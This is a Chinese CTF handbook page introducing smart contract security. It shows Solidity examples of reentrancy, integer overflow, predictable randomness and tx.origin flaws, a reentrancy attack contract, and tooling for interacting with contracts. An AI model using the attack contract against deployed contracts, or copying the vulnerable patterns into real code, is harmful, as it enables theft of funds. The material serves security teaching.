---
title: 区块链安全基础
order: 9
icon: mdi:link-variant
category:
  - CTF
  - 手册
  - Misc
---

区块链安全是 CTF 中的新兴方向，主要涉及智能合约漏洞。以太坊和 Solidity 是最常见的目标。

## 区块链基础概念

```
区块链：分布式账本，每个区块包含交易记录
以太坊：支持智能合约的区块链平台
智能合约：部署在区块链上的自动执行代码（Solidity 编写）
Gas：执行合约消耗的手续费
EOA：外部账户（用户控制）
CA：合约账户（代码控制）
```

## Solidity 基础

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
}
```

## 常见漏洞

### 1. 重入攻击（Reentrancy）

最经典的智能合约漏洞，The DAO 事件就是因此损失了 6000 万美元。

```solidity
// 漏洞合约：先转账，后更新余额
function withdraw() public {
    uint256 amount = balances[msg.sender];
    // 先转账
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
    // 后更新（漏洞！）
    balances[msg.sender] = 0;
}
```

```solidity
// 攻击合约
contract Attack {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    // 每次收到 ETH 就再次调用 withdraw
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}
```

### 2. 整数溢出（Solidity < 0.8.0）

```solidity
// 漏洞：uint8 溢出
uint8 balance = 0;
balance -= 1;  // 变成 255！

// 攻击：绕过余额检查
mapping(address => uint256) balances;
function transfer(address to, uint256 amount) public {
    // 如果 balances[msg.sender] < amount，减法溢出变成大数
    balances[msg.sender] -= amount;  // 溢出！
    balances[to] += amount;
}
```

### 3. 随机数预测

```solidity
// 漏洞：用区块信息作为随机数（可预测）
function random() private view returns (uint256) {
    return uint256(keccak256(abi.encodePacked(
        block.timestamp,
        block.difficulty,
        msg.sender
    )));
}
```

攻击者可以在同一个交易中计算相同的"随机数"，因为区块信息在同一区块内是固定的。

### 4. tx.origin 认证绕过

```solidity
// 漏洞：用 tx.origin 而不是 msg.sender 验证
function transfer(address to, uint256 amount) public {
    require(tx.origin == owner);  // 漏洞！
    // ...
}
// 攻击：诱导 owner 调用恶意合约，恶意合约再调用此函数
// tx.origin 仍然是 owner，但 msg.sender 是恶意合约
```

## CTF 解题工具

```bash
# 安装 Foundry（现代以太坊开发工具）
curl -L https://foundry.paradigm.xyz | bash
foundryup

# 与合约交互
cast call <合约地址> "函数签名(参数类型)" --rpc-url <RPC>
cast send <合约地址> "函数签名(参数类型)" 参数值 --private-key <私钥>

# 查看合约存储
cast storage <合约地址> <槽位>

# Python 交互（web3.py）
pip install web3
```

```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# 读取合约状态
contract = w3.eth.contract(address=addr, abi=abi)
balance = contract.functions.balances(my_address).call()

# 发送交易
tx = contract.functions.attack().build_transaction({
    'from': my_address,
    'value': w3.to_wei(1, 'ether'),
    'gas': 200000,
})
signed = w3.eth.account.sign_transaction(tx, private_key)
w3.eth.send_raw_transaction(signed.rawTransaction)
```

## 练手资源

- [Ethernaut](https://ethernaut.openzeppelin.com/) — OpenZeppelin 出品的智能合约 CTF
- [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/) — DeFi 安全挑战
- [CaptureTheEther](https://capturetheether.com/) — 以太坊 CTF
